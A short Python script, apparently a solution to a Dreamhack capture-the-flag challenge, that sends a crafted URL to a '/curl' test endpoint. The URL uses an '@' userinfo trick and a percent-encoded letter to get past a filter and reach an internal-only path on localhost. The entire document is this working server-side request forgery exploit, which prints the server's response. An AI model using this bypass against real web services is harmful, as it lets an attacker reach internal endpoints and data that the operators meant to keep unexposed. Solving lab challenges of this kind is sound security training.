import requests

url = "http://host1.dreamhack.games:PORT"
fir_url = url + "/api/v1/test/curl"
data = {'url':'http://dreamhack.io@localhost:8000/api/v1/test/interna%6c'}
res = requests.post(fir_url, data=data)
print(res.text)
